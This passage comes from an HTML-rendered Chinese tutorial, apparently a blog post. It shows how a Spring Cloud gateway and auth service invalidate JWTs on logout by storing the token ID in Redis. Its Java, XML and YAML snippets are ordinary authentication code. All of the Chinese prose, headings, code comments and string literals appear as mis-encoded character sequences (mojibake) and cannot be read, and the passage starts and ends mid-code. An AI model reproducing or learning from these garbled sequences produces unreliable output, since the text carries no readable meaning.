ç™½åå•methodsé›†åˆ</span></span><br><span class="line">            Set&lt;String&gt; allowMethods = entry.getValue();</span><br><span class="line">            <span class="comment">// åˆ¤æ–­æ˜¯å¦ç¬¦åˆ</span></span><br><span class="line">            <span class="keyword">if</span>(StringUtils.startsWith(path, allowPathPrefix) &amp;&amp; allowMethods.contains(method))&#123;</span><br><span class="line">                <span class="comment">// ç¬¦åˆç™½åå•</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ä¸ç¬¦åˆç™½åå•</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ç™»å½•æ‹¦æˆªï¼Œå¯ä»¥é‡‡ç”¨æœ€é«˜ä¼˜å…ˆçº§ï¼</span></span><br><span class="line">        <span class="keyword">return</span> HIGHEST_PRECEDENCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="ç™»å½•æ§åˆ¶"><a href="#ç™»å½•æ§åˆ¶" class="headerlink" title="ç™»å½•æ§åˆ¶"></a>ç™»å½•æ§åˆ¶</h2><h3 id="é€€å‡ºç™»å½•"><a href="#é€€å‡ºç™»å½•" class="headerlink" title="é€€å‡ºç™»å½•"></a>é€€å‡ºç™»å½•</h3><p>é¦–é¡µå·¦ä¸Šè§’ï¼Œç™»å½•åé™¤äº†æ˜¾ç¤ºç”¨æˆ·åï¼Œè¿˜æœ‰ä¸€ä¸ªæ³¨é”€ç™»å½•æŒ‰é’®ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022685.png" alt="1554627778912"></p>
<p>ç‚¹å‡»è¿™ä¸ªæŒ‰é’®ï¼Œè¯¥å¦‚ä½•å®ç°é€€å‡ºç™»å½•å‘¢ï¼Ÿ</p>
<h4 id="JWTç™»å½•çš„é—®é¢˜"><a href="#JWTç™»å½•çš„é—®é¢˜" class="headerlink" title="JWTç™»å½•çš„é—®é¢˜"></a>JWTç™»å½•çš„é—®é¢˜</h4><p>å›æƒ³ä¸‹ä»¥å‰æ€ä¹ˆå®ç°çš„ï¼š</p>
<ul>
<li>ç”¨æˆ·ç‚¹å‡»é€€å‡ºï¼Œå‘èµ·è¯·æ±‚åˆ°æœåŠ¡ç«¯</li>
<li>æœåŠ¡ç«¯åˆ é™¤ç”¨æˆ·sessionå³å¯</li>
</ul>
<p>æˆ‘ä»¬ç°åœ¨ç™»å½•æ˜¯æ— çŠ¶æ€çš„ï¼Œä¹Ÿå°±æ²¡æœ‰sessionï¼Œé‚£è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>æœ‰åŒå­¦ä¼šæƒ³ï¼Œå¤ªç®€å•äº†ï¼Œç›´æ¥åˆ é™¤cookieå°±å¯ä»¥äº†ã€‚</p>
<p>åˆ«å¿˜äº†ï¼Œæˆ‘ä»¬è®¾ç½®äº†httponlyï¼ŒJSæ— æ³•æ“ä½œcookieã€‚å› æ­¤ï¼Œåˆ é™¤cookieä¹Ÿå¿…é¡»å‘èµ·è¯·æ±‚åˆ°æœåŠ¡ç«¯ï¼Œç”±æœåŠ¡ç«¯æ¥åˆ é™¤cookieã€‚</p>
<p>é‚£ä¹ˆï¼Œæ˜¯ä¸æ˜¯åˆ é™¤äº†cookieï¼Œç”¨æˆ·å°±å®Œæˆäº†é€€å‡ºç™»å½•å‘¢ï¼Ÿ</p>
<p>è®¾æƒ³ä¸€ä¸‹ï¼Œåˆ é™¤äº†cookieï¼Œåªæ˜¯è®©ç”¨æˆ·åœ¨å½“å‰æµè§ˆå™¨ä¸Šçš„tokenåˆ é™¤äº†ï¼Œä½†æ˜¯è¿™ä¸ª<strong>tokenä¾ç„¶æ˜¯æœ‰æ•ˆçš„</strong>ï¼è¿™å°±æ˜¯JWTçš„å¦å¤–ä¸€ä¸ªç¼ºç‚¹äº†ï¼Œæ— æ³•æ§åˆ¶TOKENè®©å…¶å¤±æ•ˆã€‚å¦‚æœç”¨æˆ·æå‰å¤‡ä»½äº†tokenï¼Œé‚£ä¹ˆé‡æ–°å¡«å†™åˆ°cookieåï¼Œç™»å½•çŠ¶æ€ä¾ç„¶æœ‰æ•ˆã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬<strong>ä¸ä»…ä»…è¦è®©æµè§ˆå™¨ç«¯æ¸…é™¤cookieï¼Œè€Œä¸”è¦è®©è¿™ä¸ªcookieä¸­çš„tokenå¤±æ•ˆ</strong>ï¼</p>
<h4 id="è§£å†³æ€è·¯"><a href="#è§£å†³æ€è·¯" class="headerlink" title="è§£å†³æ€è·¯"></a>è§£å†³æ€è·¯</h4><p>æ€æ ·æ‰èƒ½å®ç°è¿™æ ·çš„æ•ˆæœå‘¢ï¼Ÿ</p>
<p>å¤§å®¶è‚¯å®šèƒ½æƒ³åˆ°å¾ˆå¤šåŠæ³•ï¼Œä½†æ˜¯æ— è®ºå“ªç§æ€è·¯ï¼Œéƒ½ç»•ä¸å¯ä¸€ç‚¹ï¼šJWTçš„æ— æ³•ä¿®æ”¹ç‰¹æ€§ã€‚å› æ­¤<strong>æˆ‘ä»¬ä¸èƒ½ä¿®æ”¹tokenæ¥æ ‡è®°tokenæ— æ•ˆï¼Œè€Œæ˜¯åœ¨æœåŠ¡ç«¯è®°å½•tokençŠ¶æ€</strong>ï¼Œäºæ˜¯å°±è¿èƒŒäº†æ— çŠ¶æ€æ€§çš„ç‰¹æ€§ã€‚</p>
<p>å› æ­¤ï¼Œè¦å®ç°æœåŠ¡ç«¯å¯¹ç”¨æˆ·ç™»å½•æ§åˆ¶ï¼Œå°±ä¸å¾—ä¸è¿èƒŒæ— çŠ¶æ€çš„ç‰¹æ€§ã€‚ä½†æ˜¯ï¼Œåªè¦å°½å¯èƒ½å‡å°‘åœ¨æœåŠ¡ç«¯å­˜å‚¨çš„æ•°æ®é‡ï¼Œå³ä¾¿æ˜¯æœ‰çŠ¶æ€ä¹Ÿä¸æ˜¯ä¸å¯ä»¥ã€‚<strong>è§„å®šæ˜¯æ­»çš„ï¼Œäººæ˜¯æ´»çš„</strong>ï¼</p>
<p>æˆ‘ä»¬çš„è§£å†³æ€è·¯æ˜¯è¿™æ ·çš„ï¼š</p>
<ul>
<li>ç”¨æˆ·ç™»å½•åï¼Œç”ŸæˆJWTï¼Œå…¶ä¸­åŒ…å«ç”¨æˆ·èº«ä»½ã€JWTçš„IDï¼ˆJTIï¼‰</li>
<li>ä»¥ç”¨æˆ·idä¸ºkeyï¼ŒæŠŠJWTçš„idå­˜å…¥redisï¼Œåªæœ‰redisä¸­æœ‰idçš„JWTï¼Œæ‰æ˜¯æœ‰æ•ˆçš„JWT</li>
<li>å¹¶ä¸”ç»™Redisä¸­çš„ç”¨æˆ·idè®¾ç½®æœ‰æ•ˆæœŸï¼Œæ¯”å¦‚30åˆ†é’Ÿï¼Œæœ‰æ•ˆæœŸåˆ°è‡ªåŠ¨åˆ é™¤ï¼Œç™»å½•å¤±æ•ˆ</li>
<li>é€€å‡ºç™»å½•æ—¶ï¼ŒæŠŠJTIä»Redisåˆ é™¤ï¼ŒæŠŠJWTä»cookieåˆ é™¤ï¼Œå³å¯</li>
</ul>
<p>å¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022686.png" alt="image-20200325115057407"></p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬è¦åšçš„äº‹æƒ…åŒ…æ‹¬è¿™äº›ï¼š</p>
<ul>
<li>ä¿®æ”¹ly-authä¸­çš„ç™»å½•é€»è¾‘ï¼Œåœ¨å…¶ä¸­åŠ ä¸Šå­˜å…¥JTIåˆ°Redisçš„éƒ¨åˆ†</li>
<li>ä¿®æ”¹ly-authä¸­çš„åˆ¤æ–­æ˜¯å¦ç™»å½•çš„é€»è¾‘ï¼ŒåŠ ä¸Šå¯¹Redisä¸­çš„JTIçš„æ ¡éªŒ</li>
<li>ä¿®æ”¹ly-gatewayä¸­çš„ç™»å½•æ ¡éªŒæ‹¦æˆªå™¨ï¼ŒåŠ ä¸Šå¯¹Redisä¸­çš„JTIçš„æ ¡éªŒ</li>
<li>é€€å‡ºç™»å½•ï¼Œé™¤äº†åˆ é™¤cookieï¼Œè¿˜è¦åˆ é™¤redisä¸­çš„JTI</li>
</ul>
<h4 id="ä¿®æ”¹ç™»å½•é€»è¾‘"><a href="#ä¿®æ”¹ç™»å½•é€»è¾‘" class="headerlink" title="ä¿®æ”¹ç™»å½•é€»è¾‘"></a>ä¿®æ”¹ç™»å½•é€»è¾‘</h4><p>åœ¨ç™»å½•é€»è¾‘ä¸­ï¼Œéœ€è¦ç”Ÿæˆtokenä»¥åï¼ŒæŠŠtokençš„IDå­˜å…¥redisä¸­ï¼Œå¹¶è®¾ç½®æœ‰æ•ˆæœŸã€‚æµç¨‹å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022687.png" alt="image-20200224160518176"></p>
<h5 id="å®šä¹‰Rediså¸¸é‡ç±»"><a href="#å®šä¹‰Rediså¸¸é‡ç±»" class="headerlink" title="å®šä¹‰Rediså¸¸é‡ç±»"></a>å®šä¹‰Rediså¸¸é‡ç±»</h5><p>å­˜å…¥Redisæ—¶ï¼Œéœ€è¦ä½¿ç”¨åˆ°å¦‚ï¼škeyçš„å‰ç¼€ã€è¿‡æœŸæ—¶é—´ã€ç­‰æ•°æ®ã€‚æˆ‘ä»¬åœ¨<code>ly-common</code>çš„<code>com.leyou.common.constants</code>åŒ…ä¸­å®šä¹‰ä¸€ä¸ªå¸¸é‡ç±»ï¼Œè®°å½•è¿™äº›å€¼ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common.constants;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConstants</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç”¨æˆ·ç™»å½•æ—¶è®°å½•TokenIDçš„keyå‰ç¼€</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JTI_KEY_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;auth:login:uid:&quot;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç”¨æˆ·ç™»å½•æ—¶è®°å½•TokenIDçš„è¶…æ—¶æ—¶é—´</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Long</span> <span class="variable">TOKEN_EXPIRE_MINUTES</span> <span class="operator">=</span> <span class="number">30L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ä¿®æ”¹ç™»å½•ä¸šåŠ¡"><a href="#ä¿®æ”¹ç™»å½•ä¸šåŠ¡" class="headerlink" title="ä¿®æ”¹ç™»å½•ä¸šåŠ¡"></a>ä¿®æ”¹ç™»å½•ä¸šåŠ¡</h5><p>é¦–å…ˆåœ¨ä¿®æ”¹<code>ly-auth-service</code>çš„pomæ–‡ä»¶ä¸­å¼•å…¥redisçš„ä¾èµ–ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--redis--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åä¿®æ”¹<code>ly-auth-service</code>çš„application.ymlä¸­æ·»åŠ redisåœ°å€ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">auth-service</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">ly-redis</span></span><br></pre></td></tr></table></figure>



<p>ä¿®æ”¹<code>ly-auth-service</code>ä¸­<code>com.leyou.auth.service.impl</code>åŒ…ä¸‹çš„<code>UserAuthServiceImpl</code>çš„<code>login</code>æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAuthServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserAuthService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserClient userClient;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtProperties prop;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserAuthServiceImpl</span><span class="params">(UserClient userClient, JwtProperties prop, StringRedisTemplate redisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userClient = userClient;</span><br><span class="line">        <span class="built_in">this</span>.prop = prop;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(String username, String password, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.æŸ¥è¯¢ç”¨æˆ·</span></span><br><span class="line">        <span class="type">UserDTO</span> <span class="variable">user</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            user = userClient.queryUserByUsernameAndPassword(username, password);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FeignException e) &#123;</span><br><span class="line">            <span class="comment">// æ•è·feignçš„å¼‚å¸¸ï¼Œå¹¶è·å–feignè°ƒç”¨çš„çŠ¶æ€ç å’Œå¼‚å¸¸ä¿¡æ¯</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(e.status(), e.contentUTF8(), e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 2.åˆ¤æ–­æŸ¥è¯¢ç»“æœ</span></span><br><span class="line">        <span class="keyword">if</span>(user == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// æŸ¥è¯¢å¤±è´¥ï¼Œä¸€å®šæ˜¯ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.ç”Ÿæˆtoken</span></span><br><span class="line">        <span class="comment">// 3.1.tokenID</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jti</span> <span class="operator">=</span> JwtUtils.createJTI();</span><br><span class="line">        <span class="comment">// 3.2.ç”Ÿæˆtoken</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> JwtUtils.generateTokenWithJTI(<span class="keyword">new</span> <span class="title class_">UserInfo</span>(user.getId(), user.getUsername()), jti, prop.getPrivateKey());</span><br><span class="line">        <span class="comment">// 4.è®°å½•åœ¨redisï¼Œå¹¶è®¾ç½®è¿‡æœŸæ—¶é—´</span></span><br><span class="line">        redisTemplate.opsForValue().set(</span><br><span class="line">                RedisConstants.JTI_KEY_PREFIX + user.getId(), jti, RedisConstants.TOKEN_EXPIRE_MINUTES, TimeUnit.MINUTES);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.å†™å…¥cookie</span></span><br><span class="line">        CookieUtils.builder(response)</span><br><span class="line">                .httpOnly(<span class="literal">true</span>) <span class="comment">// é™åˆ¶cookieä¸èƒ½ç”¨JSæ¥è·å–ï¼Œé¿å…XSSæ”»å‡»</span></span><br><span class="line">                .domain(UserTokenConstants.DOMAIN) <span class="comment">// cookieçš„åŸŸå</span></span><br><span class="line">                .build(UserTokenConstants.COOKIE_NAME, token);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="ä¿®æ”¹é¦–é¡µç™»å½•åˆ¤æ–­é€»è¾‘"><a href="#ä¿®æ”¹é¦–é¡µç™»å½•åˆ¤æ–­é€»è¾‘" class="headerlink" title="ä¿®æ”¹é¦–é¡µç™»å½•åˆ¤æ–­é€»è¾‘"></a>ä¿®æ”¹é¦–é¡µç™»å½•åˆ¤æ–­é€»è¾‘</h4><p>é¦–é¡µçš„ç™»å½•çŠ¶æ€åˆ¤æ–­ï¼Œéœ€è¦è¯·æ±‚åˆ°æœåŠ¡ç«¯çš„verifyæ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹è¯¥æ–¹æ³•ï¼Œåœ¨åŸæœ‰åˆ¤æ–­é€»è¾‘åŸºç¡€ä¸Šï¼Œæ·»åŠ å¯¹redisä¸­çš„JTIçš„åˆ¤æ–­ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022688.png" alt="image-20200323000701286"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">verifyUser</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.è¯»å–cookie</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> CookieUtils.getCookieValue(request, UserTokenConstants.COOKIE_NAME);</span><br><span class="line">    <span class="comment">// 2.è·å–tokenä¿¡æ¯</span></span><br><span class="line">    Payload&lt;UserInfo&gt; payload;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        payload = JwtUtils.getInfoFromToken(token, prop.getPublicKey(), UserInfo.class);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// æŠ›å‡ºå¼‚å¸¸ï¼Œè¯æ˜tokenæ— æ•ˆï¼Œç›´æ¥è¿”å›401</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;ç™»å½•å¤±æ•ˆ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">    <span class="comment">// 3.éªŒè¯tokenId</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> RedisConstants.JTI_KEY_PREFIX + userInfo.getId();</span><br><span class="line">    <span class="type">String</span> <span class="variable">cacheJTI</span> <span class="operator">=</span> redisTemplate.opsForValue().get(key);</span><br><span class="line">    <span class="keyword">if</span> (!StringUtils.equals(cacheJTI, payload.getId())) &#123;</span><br><span class="line">        <span class="comment">// tokençš„idä¸ç¬¦åˆï¼Œè¯æ˜tokenæ— æ•ˆï¼Œç›´æ¥è¿”å›401</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;ç™»å½•å¤±æ•ˆ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4.è¿”å›ç”¨æˆ·</span></span><br><span class="line">    <span class="keyword">return</span> userInfo.getUsername();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="ä¿®æ”¹ç½‘å…³æ ¡éªŒé€»è¾‘"><a href="#ä¿®æ”¹ç½‘å…³æ ¡éªŒé€»è¾‘" class="headerlink" title="ä¿®æ”¹ç½‘å…³æ ¡éªŒé€»è¾‘"></a>ä¿®æ”¹ç½‘å…³æ ¡éªŒé€»è¾‘</h4><p>ç½‘å…³æ ¡éªŒç™»å½•é™¤äº†æ£€éªŒtokenï¼Œè¿˜è¦çœ‹redisä¸­æ˜¯å¦å­˜åœ¨ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022689.png" alt="image-20200325152118464"></p>
<p>ä¿®æ”¹<code>ly-gateway</code>æ‹¦æˆªå™¨ä¸šåŠ¡ï¼Œ<code>LoginFilter</code>çš„runæ–¹æ³•ï¼Œæ·»åŠ å¯¹redisçš„JTIåˆ¤æ–­ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022690.png" alt="image-20200322234903860"></p>
<p>å®Œæ•´ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.gateway.filters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.RedisConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.UserTokenConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.gateway.config.FilterProperties;</span><br><span class="line"><span class="keyword">import</span> com.leyou.gateway.config.JwtProperties;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.ExpiredJwtException;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.security.SignatureException;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.Ordered;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpCookie;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.CollectionUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.MultiValueMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginFilter</span> <span class="keyword">implements</span> <span class="title class_">GlobalFilter</span>, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtProperties jwtProp;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> FilterProperties filterProp;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginFilter</span><span class="params">(JwtProperties jwtProp, FilterProperties filterProp, StringRedisTemplate redisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jwtProp = jwtProp;</span><br><span class="line">        <span class="built_in">this</span>.filterProp = filterProp;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.è·å–Requestå¯¹è±¡</span></span><br><span class="line">        <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">        <span class="comment">// 2.è·å–cookieä¸­çš„token</span></span><br><span class="line">        MultiValueMap&lt;String, HttpCookie&gt; cookies = request.getCookies();</span><br><span class="line">        List&lt;HttpCookie&gt; cookieList = cookies.get(UserTokenConstants.COOKIE_NAME);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (CollectionUtils.isEmpty(cookieList)) &#123;</span><br><span class="line">                <span class="comment">// æ²¡æœ‰tokenï¼Œæ‹¦æˆªè¯·æ±‚</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SignatureException</span>(<span class="string">&quot;æœªç™»å½•ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> cookieList.get(<span class="number">0</span>).getValue();</span><br><span class="line">            <span class="comment">// 3.é€šè¿‡JWTå¯¹tokenè¿›è¡Œè§£æ</span></span><br><span class="line">            Payload&lt;UserInfo&gt; payload = JwtUtils.getInfoFromToken(token, jwtProp.getPublicKey(), UserInfo.class);</span><br><span class="line">            <span class="comment">// 3.1.è·å–ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line">            <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">            <span class="comment">// 3.2.è·å–redisä¸­çš„JTI</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> RedisConstants.JTI_KEY_PREFIX + userInfo.getId();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cacheJTI</span> <span class="operator">=</span> redisTemplate.opsForValue().get(key);</span><br><span class="line">            <span class="comment">// 3.3.æ¯”è¾ƒå½“å‰tokençš„jtiå’Œredisä¸­çš„JTI</span></span><br><span class="line">            <span class="keyword">if</span> (!StringUtils.equals(cacheJTI, payload.getId())) &#123;</span><br><span class="line">                <span class="comment">// æ— æ•ˆçš„tokenï¼Œè¿”å›400</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SignatureException</span>(<span class="string">&quot;æœªç™»å½•æˆ–è€…ç™»å½•å·²ç»è¿‡æœŸ&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// TODO æƒé™åˆ¤æ–­</span></span><br><span class="line">            log.info(<span class="string">&quot;ç”¨æˆ·&#123;&#125;æ­£åœ¨è®¿é—®èµ„æºï¼š&#123;&#125;&quot;</span>, userInfo.getUsername(), request.getPath());</span><br><span class="line">            <span class="comment">// æ”¾è¡Œ</span></span><br><span class="line">            <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExpiredJwtException | SignatureException e) &#123;</span><br><span class="line">            <span class="comment">// æ²¡æœ‰ç™»å½•ï¼Œåˆ¤æ–­å½“å‰è¯·æ±‚æ˜¯å¦æ˜¯ç™½åå•è¯·æ±‚</span></span><br><span class="line">            <span class="keyword">if</span> (isAllowRequest(request)) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœæ˜¯ï¼Œæ”¾è¡Œ</span></span><br><span class="line">                <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">            &#125;</span><br><span class="line">            log.error(<span class="string">&quot;ç”¨æˆ·éæ³•è®¿é—®èµ„æºï¼š&#123;&#125;&quot;</span>, request.getPath());</span><br><span class="line">            <span class="comment">//  - è§£æä¸é€šè¿‡ï¼Œè¿”å›401</span></span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);</span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span 